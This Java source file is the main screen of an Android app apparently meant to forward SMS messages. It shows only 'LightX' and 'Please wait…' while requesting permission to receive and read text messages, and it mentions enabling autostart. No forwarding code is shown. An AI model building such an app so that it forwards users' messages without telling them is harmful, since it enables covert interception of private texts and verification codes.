package com.lightx.smsforwarder;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * MainActivity shows simple "Please wait…" UI and requests runtime permissions.
 * It also offers a helper to open app settings for OEM autostart if user wants.
 */
public class MainActivity extends AppCompatActivity {
    private static final int REQ_PERMISSIONS = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(80,200,80,200);
        root.setBackgroundColor(0xFFFFFFFF);

        TextView title = new TextView(this);
        title.setText("LightX");
        title.setTextSize(28f);
        title.setTextColor(0xFF0D47A1); // deep blue
        root.addView(title);

        ProgressBar pb = new ProgressBar(this);
        root.addView(pb);

        TextView tv = new TextView(this);
        tv.setText("Please wait…");
        tv.setTextSize(18f);
        root.addView(tv);

        setContentView(root);

        requestNecessaryPermissions();
    }

    private void requestNecessaryPermissions() {
        String[] needed;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed = new String[] {
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.POST_NOTIFICATIONS
            };
        } else {
            needed = new String[] {
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            };
        }
        boolean ok = true;
        for (String p: needed) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                ok = false; break;
            }
        }
        if (!ok) {
            ActivityCompat.requestPermissions(this, needed, REQ_PERMISSIONS);
        }
    }

    // Helper to open app settings if user wants to enable autostart/OEM options
    private void openAppSettings() {
        try {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (Exception e) {
            // ignore
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
